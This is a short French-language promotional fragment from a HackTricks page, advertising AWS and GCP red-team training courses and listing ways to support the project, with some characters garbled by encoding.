<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PR au** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}
